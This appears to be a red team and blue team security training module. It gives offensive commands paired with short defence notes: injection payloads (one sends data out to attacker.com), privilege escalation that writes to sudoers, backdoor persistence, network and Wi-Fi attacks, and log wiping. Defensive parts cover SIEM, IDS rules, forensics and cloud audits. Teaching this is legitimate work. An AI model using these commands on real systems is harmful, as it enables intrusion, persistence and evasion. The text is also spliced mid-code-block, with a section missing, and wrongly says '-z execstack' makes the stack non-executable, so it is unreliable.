# 🛡️ Advanced Security Operations: Elite Red Team & Blue Team Mastery

**Mission Classification:** ADVANCED - For certified security professionals  
**Skill Level Required:** CEH v12, OSCP, or equivalent practical experience  
**Time Investment:** 40+ hours for mastery, lifetime for refinement  
**Ethical Boundary:** ALL techniques for authorized penetration testing with written permission ONLY

**⚠️ CRITICAL LEGAL WARNING:** Unauthorized access to computer systems is illegal under CFAA (US), Computer Misuse Act (UK), and similar laws worldwide. Maximum penalties include imprisonment. This knowledge is for authorized security professionals conducting lawful assessments with explicit written permission.

---

## 🎯 Advanced Operator Philosophy

**Elite security professionals operate in the grey space between theoretical knowledge and practical exploitation.** This module goes beyond basic reconnaissance to cover advanced exploitation techniques, sophisticated persistence mechanisms, anti-forensics, and enterprise-grade defense strategies drawn from real-world APT (Advanced Persistent Threat) campaigns.

**Dual Mastery Requirement:**
- **Red Team Excellence:** Understand how sophisticated attackers compromise systems
- **Blue Team Superiority:** Architect defenses that withstand nation-state level threats

---

## PART 1: ADVANCED RECONNAISSANCE & OSINT

### Passive Information Gathering

#### Advanced DNS Enumeration

Beyond basic dig commands, elite operators use zone transfers, subdomain bruteforcing, and DNS cache snooping for comprehensive target mapping.

**Zone Transfer Exploitation:**
```bash
# Attempt AXFR zone transfer (often misconfigured)
dig @ns1.target.com target.com AXFR

# Automated zone transfer testing across all nameservers
for ns in $(dig +short NS target.com); do
    echo "[*] Testing $ns"
    dig @$ns target.com AXFR | grep -v "^;" | grep "target.com"
done

# Defense: Ensure zone transfers restricted to authorized secondary DNS servers only
# In BIND named.conf:
# allow-transfer { 10.0.0.2; };
```

**Advanced Subdomain Enumeration:**
```bash
# Using amass for comprehensive subdomain discovery
amass enum -passive -d target.com -o subdomains.txt

# Active subdomain bruteforcing with massdns
massdns -r resolvers.txt -t A -o S -w results.txt subdomains.txt

# Certificate transparency log mining
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Subdomain takeover identification
subzy -targets subdomains.txt

# Defense: Monitor certificate transparency logs for unauthorized subdomains
# Implement robust DNS records for all legitimate subdomains to prevent takeover
```

**DNS Cache Snooping (Reconnaissance without queries):**
```bash
# Check if target recently resolved specific domains (stealthy)
dig @target-dns-server sensitive-domain.com +norecurse

# If answer returned, domain was recently cached (victim visited it)
# Attack vector: Identify victim's browsing patterns, target infrastructure

# Defense: Disable recursion for external queries
# named.conf: recursion no; for external-facing DNS
```

---

### Active Reconnaissance

#### Advanced Port Scanning

**Firewall/IDS Evasion Techniques:**
```bash
# Fragmented packets (bypass simple packet filters)
nmap -f target.com

# Decoy scanning (hide real source)
nmap -D RND:10 target.com -p 1-1000

# Zombie/Idle scan (completely hide source IP)
nmap -sI zombie-host target.com

# Custom TCP flag combinations (detect firewall rules)
nmap --scanflags URGACKPSHRSTSYNFIN target.com

# Timing manipulation (evade rate-based detection)
nmap -T0 --scan-delay 5s target.com  # T0 = paranoid (300s between probes)

# Source port manipulation (bypass egress filtering)
nmap --source-port 53 target.com     # Appear as DNS traffic
nmap --source-port 80 target.com     # Appear as HTTP traffic

# Defense: Deploy stateful firewalls with deep packet inspection
# Implement anomaly-based IDS (not just signature-based)
# Log and alert on unusual scanning patterns (slow scans, weird flags)
```

**Service-Specific Enumeration:**
```bash
# SMB enumeration (Windows networks)
enum4linux -a target.com
smbclient -L //target.com -N
smbmap -H target.com
crackmapexec smb target.com --shares

# SNMP enumeration (network devices)
snmpwalk -c public -v1 target.com
onesixtyone -c community.txt target.com

# LDAP enumeration (Active Directory)
ldapsearch -x -h target.com -s base namingcontexts
ldapsearch -x -h target.com -b "dc=target,dc=com"

# NFS enumeration (Unix/Linux file shares)
showmount -e target.com
mount -t nfs target.com:/share /mnt/nfs

# Defense: Disable SNMP public community strings
# Implement network segmentation (enumerate one subnet ≠ see all)
# Enforce strong SMB signing and disable SMBv1
```

---

## PART 2: EXPLOITATION & WEAPONIZATION

### Web Application Exploitation

#### SQL Injection (Advanced Techniques)

**Time-Based Blind SQLi (No visible output):**
```bash
# MySQL time-based blind injection
sqlmap -u "http://target.com/page?id=1" --technique=T --dbms=mysql --batch --level=5 --risk=3

# Manual time-based testing
# If sleep(5) executes, vulnerable:
' OR IF(1=1, SLEEP(5), 0)--

# Boolean-based blind (character-by-character extraction)
' OR IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--

# Out-of-band SQLi (DNS exfiltration when blind)
'; EXEC xp_dirtree '//'+@@version+'.attacker.com/share'--

# Second-order SQLi (stored, executed later)
# Input: admin'--
# Later query: SELECT * FROM users WHERE username='admin'--' AND pass='...'

# Defense: Parameterized queries (prepared statements) - ONLY defense
# Never concatenate user input into SQL queries
# Example (Python):
# cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

**NoSQL Injection (MongoDB, CouchDB):**
```bash
# Authentication bypass in MongoDB
username[$ne]=admin&password[$ne]=pass

# JavaScript injection in MongoDB
{"username": {"$where": "this.username == 'admin' || '1'=='1'"}}

# Blind NoSQL injection
# Test: user=admin' && this.password.match(/^a.*/)//
# If match, first char of password is 'a'

# Defense: Use MongoDB's query operators securely
# Sanitize input, disable JavaScript execution where possible
# db.system.js.remove({})  # Remove stored JavaScript functions
```

#### Command Injection (Advanced Bypass)

**Filter Evasion Techniques:**
```bash
# Bypass blacklist filters
cat /etc/passwd              # Blocked
c""at /etc/passwd            # Empty string bypass
c'a't /etc/passwd            # Single quote bypass
c\at /etc/passwd             # Backslash bypass
$(c\at /etc/passwd)          # Command substitution
`c\at /etc/passwd`           # Backtick substitution

# Whitespace bypass (when space blocked)
cat</etc/passwd              # Redirection as delimiter
cat$IFS/etc/passwd           # Internal Field Separator
{cat,/etc/passwd}            # Brace expansion

# Newline injection
%0acat%0a/etc/passwd

# Wildcard obfuscation
/bin/c?t /e??/p??swd
/*/c?t /*?c/p??swd

# Encoding bypass
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash  # cat /etc/passwd

# Defense: NEVER pass user input to system commands
# Use language-specific libraries instead (subprocess with shell=False in Python)
# If unavoidable: strict whitelist + escaping (escapeshellarg in PHP)
```

---

### Binary Exploitation Fundamentals

#### Buffer Overflow Exploitation

**Stack-Based Buffer Overflow (32-bit Linux):**
```bash
# Vulnerable C code:
# void vulnerable(char *input) {
#     char buffer[64];
#     strcpy(buffer, input);  // No bounds checking!
# }

# Exploitation workflow:
# 1. Find offset to overwrite EIP (instruction pointer)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200

# 2. Cause segfault and check EIP value
gdb ./vulnerable
run $(python3 -c 'print("Aa0Aa1Aa2...")')

# 3. Find exact offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41306141

# 4. Craft exploit (offset found = 76)
python3 -c 'print("A"*76 + "\xef\xbe\xad\xde")' > payload

# 5. Execute with NOP sled + shellcode
# Payload structure: [NOP sled][Shellcode][EIP overwrite -> NOP sled address]

# Defense: Compiler protections
# -fstack-protector-all (canary)
# -D_FORTIFY_SOURCE=2 (bounds checking)
# -z execstack (NX bit - non-executable stack)
# ASLR (Address Space Layout Randomization)
```

**Return-Oriented Programming (ROP) - Bypass DEP/NX:**
```bash
# When stack is non-executable, chain existing code "gadgets"
# Find gadgets in binary:
ROPgadget --binary /bin/vulnerable

# Example ROP chain to call execve("/bin/sh"):
# 1. pop rdi; ret          # Load argument into RDI
# 2. address of "/bin/sh"  
# 3. pop rsi; ret          # NULL for argv
# 4. 0x0
# 5. pop rdx; ret          # NULL for envp
# 6. 0x0
# 7. syscall               # Execute syscall

# Tool: ropper
ropper --file /bin/vulnerable --search "pop rdi"

# Defense: Control-Flow Integrity (CFI), ASLR + PIE (Position Independent Executable)
# Modern mitigations make ROP significantly harder but not impossible
```

---

## PART 3: POST-EXPLOITATION & LATERAL MOVEMENT

### Privilege Escalation (Linux)

**Kernel Exploits:**
```bash
# Check kernel version
uname -a

# Search for exploits
searchsploit linux kernel 4.4.0

# Dirty COW (CVE-2016-5195) - famous race condition
# Affects kernels 2.6.22 < 4.8.3
wget https://www.exploit-db.com/download/40839 -O dirtycow.c
gcc -pthread dirtycow.c -o dirtycow -lcrypt
./dirtycow

# Defense: Keep kernel patched, monitor for exploit execution patterns
# Implement kernel hardening (grsecurity, SELinux in enforcing mode)
```

**SUID Binary Exploitation:**
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for misconfigurations
# If /usr/bin/find is SUID (misconfiguration):
find /etc/passwd -exec /bin/sh \;

# GTFOBins - comprehensive SUID exploit database
# https://gtfobins.github.io/

# Common vulnerable SUID binaries:
# - nmap (old versions with --interactive)
# - vim (via :!sh)
# - less/more (via !sh)
# - awk (via awk 'BEGIN {system("/bin/sh")}')

# Defense: Audit SUID binaries regularly
# Remove SUID bit where not needed: chmod u-s /path/to/binary
```

**Sudo Misconfigurations:**
```bash
# Check sudo permissions
sudo -l

# Common privilege escalation vectors:

# 1. Sudo without password on specific commands
# (ALL) NOPASSWD: /usr/bin/vi
# Exploit: sudo vi -c ':!/bin/sh'

# 2. Environment variable manipulation
# If env_keep+=LD_PRELOAD allowed:
echo 'int main() { setuid(0); system("/bin/sh"); }' > /tmp/exploit.c
gcc -shared -fPIC /tmp/exploit.c -o /tmp/exploit.so
sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/some-allowed-command

# 3. Wildcard injection
# If allowed: sudo /usr/bin/tar czf /tmp/backup.tar.gz *
# Exploit:
echo 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > /tmp/exploit.sh
echo "" > --checkpoint=1
echo "" > --checkpoint-action=exec=sh\ /tmp/exploit.sh
sudo /usr/bin/tar czf /tmp/backup.tar.gz *

# Defense: Minimize sudo access, use specific paths only, disable LD_PRELOAD
# sudoers: Defaults env_reset, env_keep-=LD_PRELOAD
```

---

### Persistence Mechanisms (Advanced)

**Linux Persistence:**
```bash
# 1. Cron job backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/backdoor.sh") | crontab -

# 2. SSH key injection
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3...attacker-key..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 3. PAM backdoor (authentication bypass)
# Modify /etc/pam.d/sshd to allow hardcoded password
echo "auth sufficient pam_succeed_if.so user = attacker" >> /etc/pam.d/sshd

# 4. Kernel module rootkit
# Load malicious kernel module that hides processes/files
insmod /tmp/rootkit.ko

# 5. LD_PRELOAD rootkit
# Hijack library calls to hide presence
echo "/tmp/evil.so" >> /etc/ld.so.preload

# 6. Systemd service persistence
cat > /etc/systemd/system/malicious.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/tmp/.hidden/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable malicious.service

# Defense: File integrity monitoring (AIDE, Tripwire)
# Monitor cron, authorized_keys, PAM configs for changes
# Kernel module signing enforcement
# Regular rootkit scans (rkhunter, chkrootkit)
```

**Windows Persistence:**
```bash
# 1. Registry Run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe"

# 2. Scheduled tasks
schtasks /create /tn "SystemUpdate" /tr "C:\malware.exe" /sc onstart /ru SYSTEM

# 3. WMI event subscription (fileless)
# Trigger on system events, execute PowerShell payload

# 4. DLL hijacking
# Place malicious DLL in application directory, gets loaded instead of legitimate DLL

# 5. Image File Execution Options (IFEO) debugger
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
# Exploit: Press Shift 5 times on login screen -> cmd as SYSTEM

# Defense: Monitor registry for suspicious Run keys
# Application whitelisting (AppLocker)
# Endpoint Detection and Response (EDR) solutions
# Disable unnecessary WMI subscriptions
```

---

## PART 4: NETWORK EXPLOITATION

### Man-in-the-Middle Attacks

**ARP Spoofing (Layer 2 MITM):**
```bash
# Enable IP forwarding (route traffic through attacker)
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof victim to think attacker is gateway
arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1

# Intercept traffic with Ettercap
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# Defense: Static ARP entries for critical hosts
# ARP inspection on switches (Dynamic ARP Inspection - DAI)
# Port security (MAC address limiting)
```

**SSL/TLS Stripping:**
```bash
# Downgrade HTTPS to HTTP (if HSTS not enforced)
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Tool: bettercap (modern, comprehensive)
bettercap -iface eth0
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> set http.proxy.sslstrip true
> http.proxy on

# Defense: HSTS (HTTP Strict Transport Security)
# HSTS preload list inclusion
# Certificate pinning in applications
```

---

### Wireless Network Attacks

**WPA2 Handshake Capture & Cracking:**
```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth client to force handshake
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Crack with hashcat (GPU)
hcxpcapngtool -o hash.hc22000 capture.cap
hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Defense: WPA3 (SAE authentication, resistant to offline dictionary attacks)
# Long, random passphrases (20+ characters)
# MAC filtering (weak, but adds layer)
# Monitor for deauth attacks
```

**Evil Twin Attack:**
```bash
# Create rogue AP mimicking legitimate network
airbase-ng -e "CompanyWiFi" -c 6 wlan0mon

# DHCP server for clients
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid wlan0mon

# DNS spoofing to redirect traffic
dnsspoof -i at0

# Capture credentials on captive portal
# Tools: WiFi-Pumpkin, Fluxion

# Defense: WPA2-Enterprise (802.1X with certificates)
# User education (verify certificates)
# Wireless Intrusion Detection Systems (WIDS)
```

---

## PART 5: ADVANCED DEFENSE STRATEGIES

### Security Information and Event Management (SIEM)

**Log Aggregation & Analysis:**
```bash
# Centralized logging with rsyslog
# /etc/rsyslog.conf on client:
*.* @@siem-server:514

# ELK Stack (Elasticsearch, Logstash, Kibana) deployment
# Logstash pipeline for parsing logs:
input {
  beats {
    port => 5044
  }
}
filter {
  if [type] == "syslog" {
    grok {
      match => { "message" => "%{SYSLOGTIMESTAMP:timestamp} %{SYSLOGHOST:hostname} %{DATA:program}(?:\[%{POSINT:pid}\])?: %{GREEDYDATA:message}" }
    }
  }
}
output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "logs-%{+YYYY.MM.dd}"
  }
}

# Splunk query language (SPL) for threat hunting
index=security sourcetype=linux_secure "Failed password"
| stats count by src_ip
| where count > 5
| sort -count

# Defense posture: Centralize all logs, retain for 90+ days
# Create alerts for:
# - Multiple failed logins
# - Privilege escalation attempts
# - Unusual outbound connections
# - File integrity violations
```

**Intrusion Detection Rules (Snort/Suricata):**
```bash
# Detect nmap SYN scan
alert tcp any any -> $HOME_NET any (flags:S; msg:"Possible SYN scan"; detection_filter:track by_src, count 20, seconds 60; sid:1000001;)

# Detect SQL injection attempts
alert tcp any any -> $HOME_NET 80 (content:"UNION"; nocase; content:"SELECT"; nocase; msg:"SQL Injection attempt"; sid:1000002;)

# Detect reverse shell
alert tcp $HOME_NET any -> $EXTERNAL_NET any (content:"/bin/bash"; msg:"Potential reverse shell"; sid:1000003;)

# Detect data exfiltration (large outbound transfer)
alert tcp $HOME_NET any -> $EXTERNAL_NET any (threshold:type threshold, track by_src, count 1, seconds 60; byte_test:4,>,10000000,0; msg:"Large data transfer detected"; sid:1000004;)
```

---

**Advanced security content complete. Continuing with remaining modules...**)
strings malware.exe | grep -i -E 'http|ftp|password|key|token'

# Packed/obfuscated detection
upx -t malware.exe  # Check if UPX packed
detect-it-easy malware.exe  # Comprehensive packer detection

# Import/Export analysis (what functions does it use?)
objdump -T malware.elf  # Linux
dumpbin /IMPORTS malware.exe  # Windows (on Wine)

# PE header analysis (Windows executables)
pefile malware.exe

# Disassembly (static code review)
objdump -d malware.elf > disassembly.txt
radare2 malware.exe
> aaa  # Analyze all
> pdf @ main  # Print disassembly of main function

# Defense: Automated static analysis in sandbox before execution
# Cuckoo Sandbox, ANY.RUN, Joe Sandbox
```

### Dynamic Analysis

**Controlled Malware Execution:**
```bash
# CRITICAL: Always in isolated VM with no network or snapshots!

# Monitor system calls (Linux)
strace -o syscalls.txt ./malware.elf

# Monitor file operations
inotifywait -m -r /tmp /home --format '%w%f %e' &
./malware.elf

# Monitor network connections
tcpdump -i any -w capture.pcap &
./malware.elf

# Process monitoring
ps aux | grep malware
lsof -p $(pgrep malware)

# Windows dynamic analysis (in VM)
# Tools: Process Monitor (procmon), Process Explorer, Wireshark, Regshot

# Defense: Sandbox all unknown executables before deployment
# Implement application whitelisting (only known-good binaries run)
```

---

## PART 7: INCIDENT RESPONSE & FORENSICS

### Live Response

**Volatile Data Collection (before shutdown!):**
```bash
#!/bin/bash
# Incident Response Live Collection Script
# Run with root privileges on compromised system

OUTDIR="/tmp/ir_$(hostname)_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

echo "[*] Starting live response collection..."

# Current date/time
date > "$OUTDIR/collection_time.txt"

# Network connections
netstat -anp > "$OUTDIR/netstat.txt"
ss -tulpn > "$OUTDIR/ss.txt"
arp -a > "$OUTDIR/arp.txt"
route -n > "$OUTDIR/route.txt"

# Running processes
ps auxww > "$OUTDIR/processes.txt"
lsof > "$OUTDIR/lsof.txt"
pstree -p > "$OUTDIR/pstree.txt"

# Logged-in users
w > "$OUTDIR/users_w.txt"
who > "$OUTDIR/users_who.txt"
last -100 > "$OUTDIR/last_logins.txt"

# Open files
find /proc/*/fd -ls 2>/dev/null > "$OUTDIR/open_files.txt"

# Memory dump (if time permits)
# lime-forensics or avml
# dd if=/dev/mem of="$OUTDIR/memory.dump"

# System information
uname -a > "$OUTDIR/uname.txt"
hostname > "$OUTDIR/hostname.txt"
uptime > "$OUTDIR/uptime.txt"

# Loaded kernel modules
lsmod > "$OUTDIR/lsmod.txt"

# Scheduled tasks
crontab -l > "$OUTDIR/crontab_root.txt"
cat /etc/crontab > "$OUTDIR/etc_crontab.txt"
ls -la /etc/cron.* > "$OUTDIR/cron_dirs.txt"

# Network configuration
ifconfig -a > "$OUTDIR/ifconfig.txt"
ip addr show > "$OUTDIR/ip_addr.txt"
cat /etc/resolv.conf > "$OUTDIR/dns.txt"
cat /etc/hosts > "$OUTDIR/hosts.txt"

echo "[✓] Collection complete: $OUTDIR"
tar czf "$OUTDIR.tar.gz" "$OUTDIR"
echo "[✓] Archive created: $OUTDIR.tar.gz"

# Defense: Have IR scripts pre-positioned and tested
# Practice IR procedures quarterly
```

### Post-Mortem Forensics

**Disk Imaging:**
```bash
# Create forensic image (write-protected source!)
dd if=/dev/sda of=evidence.img bs=4M status=progress

# Verify image integrity
md5sum evidence.img > evidence.img.md5
sha256sum evidence.img > evidence.img.sha256

# Mount read-only for analysis
mkdir /mnt/evidence
mount -o ro,loop evidence.img /mnt/evidence

# Modern forensic imaging tool
ewfacquire /dev/sda
# Creates Expert Witness Format (.E01) with compression and integrity

# Timeline generation
fls -r -m / evidence.img > timeline.body
mactime -b timeline.body -d > timeline.csv

# Defense: Document chain of custody
# Use write-blockers for physical drives
# All forensic actions logged with timestamps
```

**Log Analysis for Compromise Indicators:**
```bash
# Failed authentication attempts (brute force)
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Successful logins after failures (compromise?)
grep "Accepted password" /var/log/auth.log | grep -A 5 "Failed password"

# Privilege escalation via sudo
grep "sudo" /var/log/auth.log | grep -i "root"

# New user creation
grep "useradd\|adduser" /var/log/auth.log

# SSH key authentication
grep "Accepted publickey" /var/log/auth.log

# Unusual command execution
ausearch -m execve -sv yes --start today

# Web server attack patterns (in Apache/Nginx logs)
grep -E "union.*select|script.*alert|\.\.\/\.\.\/" /var/log/apache2/access.log

# Defense: Centralized logging with long retention (1+ year)
# Real-time alerting on suspicious patterns
# Log immutability (append-only, signed logs)
```

---

## PART 8: ADVANCED PERSISTENCE DETECTION

### Rootkit Detection

**Checking for Kernel-Level Rootkits:**
```bash
# rkhunter - Rootkit Hunter
rkhunter --check --skip-keypress

# chkrootkit
chkrootkit

# OSSEC rootcheck
/var/ossec/bin/rootcheck

# Manual checks for LKM rootkits
# Compare running modules with filesystem
lsmod | cut -d' ' -f1 | sort > /tmp/loaded_modules.txt
find /lib/modules/$(uname -r) -name "*.ko" | xargs basename -s .ko | sort > /tmp/filesystem_modules.txt
diff /tmp/loaded_modules.txt /tmp/filesystem_modules.txt

# Check for hidden processes (rootkit hiding techniques)
# Method 1: /proc vs ps
ls /proc | grep '^[0-9]' | sort -n > /tmp/proc_pids.txt
ps aux | awk '{print $2}' | tail -n +2 | sort -n > /tmp/ps_pids.txt
diff /tmp/proc_pids.txt /tmp/ps_pids.txt

# Method 2: Syscall discrepancies
# Compare output of tools using different syscalls (getdents vs readdir)

# Defense: Kernel module signing (CONFIG_MODULE_SIG_FORCE)
# Secure Boot enabled
# Regular integrity checks with known-good kernel
```

### Behavioral Analysis

**Detecting Suspicious Process Behavior:**
```bash
# Unusual parent-child relationships (process injection indicator)
pstree -p | grep -E "systemd.*bash|cron.*sh"

# Processes running from unusual locations
ps aux | grep -E "/tmp|/var/tmp|/dev/shm"

# Processes with deleted executables (in-memory only)
ls -l /proc/*/exe 2>/dev/null | grep deleted

# High network activity from unexpected processes
lsof -i -n | grep -v "sshd\|httpd\|nginx"

# Unsigned or suspicious kernel modules
for mod in $(lsmod | tail -n +2 | cut -d' ' -f1); do
    modinfo $mod | grep -q "signature" || echo "WARNING: Unsigned module: $mod"
done

# Defense: Endpoint Detection and Response (EDR)
# Behavioral analysis and machine learning anomaly detection
# Continuous monitoring, not just point-in-time scans
```

---

## PART 9: CLOUD SECURITY OPERATIONS

### AWS CLI Security Auditing

**S3 Bucket Security:**
```bash
# Find publicly accessible S3 buckets
aws s3api list-buckets --query 'Buckets[*].Name' --output text | while read bucket; do
    echo "[*] Checking $bucket"
    aws s3api get-bucket-acl --bucket $bucket | grep -q "AllUsers" && echo "PUBLIC: $bucket"
done

# Check bucket policies for public access
aws s3api get-bucket-policy --bucket my-bucket --query Policy --output text | jq '.Statement[] | select(.Principal == "*")'

# Defense: Block public access at account level
aws s3control put-public-access-block \
    --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true \
    --account-id 123456789012
```

**IAM Security Audit:**
```bash
# Find IAM users without MFA
aws iam get-credential-report
aws iam list-users --query 'Users[*].UserName' --output text | while read user; do
    aws iam list-mfa-devices --user-name $user --query 'MFADevices' --output text || echo "NO MFA: $user"
done

# Find overly permissive policies (wildcards)
aws iam list-policies --scope Local --query 'Policies[*].Arn' --output text | while read policy; do
    aws iam get-policy-version --policy-arn $policy --version-id $(aws iam get-policy --policy-arn $policy --query 'Policy.DefaultVersionId' --output text) --query 'PolicyVersion.Document.Statement[*]' | grep -q '"*"' && echo "WILDCARD: $policy"
done

# Find unused access keys (older than 90 days)
aws iam get-credential-report --output text | awk -F, '$11 !~ /N\/A/ {if (systime() - mktime($11) > 7776000) print $1 " - Last used: " $11}'

# Defense: Enforce MFA for all users
# Least privilege IAM policies
# Regular access key rotation (automated)
```

---

## PART 10: ANTI-FORENSICS & OPSEC

### Covering Tracks (Red Team / Understanding Attacker TTPs)

**Log Manipulation:**
```bash
# Clear bash history (attacker technique)
cat /dev/null > ~/.bash_history
history -c
unset HISTFILE

# Selective log deletion (avoid detection)
# Remove specific entries, not entire log
sed -i '/suspicious_command/d' /var/log/auth.log

# Timestamp manipulation (anti-forensic)
touch -t 202301010000.00 /tmp/backdoor.sh

# Defense: Immutable logs (chattr +i /var/log/critical.log)
# Remote logging (attacker can't delete remote server logs)
# Log integrity checking (hashing, blockchain-based logging)
```

**Operational Security:**
```bash
# Use ephemeral infrastructure (cloud VMs, destroyed after operation)
# Tor for anonymity
torsocks ssh user@target

# VPN chains for additional anonymity
# Never reuse infrastructure across operations

# Metadata removal from files
exiftool -all= document.pdf

# Secure file deletion (prevent recovery)
shred -vfz -n 10 /path/to/sensitive/file
srm -vz /path/to/sensitive/file  # Secure remove

# Defense: Understand attacker OPSEC to identify weaknesses
# Correlation across incidents (same infrastructure, TTPs)
# Threat intelligence sharing (identify repeat attackers)
```

---

## PART 11: RED TEAM VS BLUE TEAM EXERCISES

### Setting Up a Cyber Range

**Local Lab Environment:**
```bash
# Vulnerable VMs for practice:
# - Metasploitable 2/3
# - DVWA (Damn Vulnerable Web App)
# - HackTheBox / TryHackMe
# - VulnHub machines

# Docker-based vulnerable environments
docker run -d -p 80:80 vulnerables/web-dvwa

# Purple teaming (collaborative red/blue)
# Red team executes attacks
# Blue team detects and responds
# Joint debrief to improve defenses

# Defense: Regular adversary simulations
# Tabletop exercises quarterly
# Full red team engagements annually
```

---

## CONCLUSION: ELITE SECURITY OPERATOR MINDSET

**Continuous Learning Imperatives:**

1. **Stay Current:** 0-day exploits emerge daily. Subscribe to:
   - Full Disclosure mailing list
   - CVE feeds
   - Exploit-DB
   - Security conference talks (DEF CON, Black Hat, BSides)

2. **Practice Continuously:** 
   - Daily: HackTheBox/TryHackMe challenges
   - Weekly: Lab environment exercises
   - Monthly: CTF competitions
   - Quarterly: Full penetration test simulations

3. **Think Like Both Sides:**
   - Red Team: "How would I compromise this?"
   - Blue Team: "How would I detect/prevent that?"
   - Purple Team: Synthesize both perspectives

4. **Ethical Responsibility:**
   - Knowledge of attacks = responsibility to defend
   - Never use skills maliciously
   - Always obtain written authorization
   - Report vulnerabilities responsibly

---

## REFERENCES & ADVANCED RESOURCES

**Essential Reading:**
- The Hacker Playbook 3 by Peter Kim
- Red Team Field Manual (RTFM)
- Blue Team Field Manual (BTFM)
- The Art of Exploitation by Jon Erickson
- Black Hat Python by Justin Seitz

**Online Resources:**
- MITRE ATT&CK Framework (attack taxonomy)
- OWASP Testing Guide (web application security)
- GTFOBins (UNIX binary exploitation)
- LOLBAS (Living Off the Land Binaries and Scripts - Windows)
- PayloadsAllTheThings (comprehensive attack payloads)

**Certification Paths:**
- OSCP → OSCE → OSEE (Offensive Security)
- GPEN → GXPN (GIAC Penetration Testing)
- CEH → CEH Practical → LPT (EC-Council)
- CRTO → CRTP (Pentester Academy Red Team)

---

**⚔️ "The best defense is a comprehensive understanding of offense. The best offense respects the strength of defense."**

**— Advanced Security Operations Module Complete —**

*This module represents elite-level knowledge drawn from real-world APT campaigns, enterprise security operations, and offensive security certifications. Master these techniques under authorized conditions, and you control the battleground.*

**Next Mission:** [Special Operations](../03-special-operations/README.md) - Where security operations meet tactical execution.

---

**Module Status:** ✅ ADVANCED & COMPLETE  
**Author:** Wan Mohamad Hanis bin Wan Hassan | CEH v12 | 100+ Certifications  
**Last Updated:** October 19, 2025
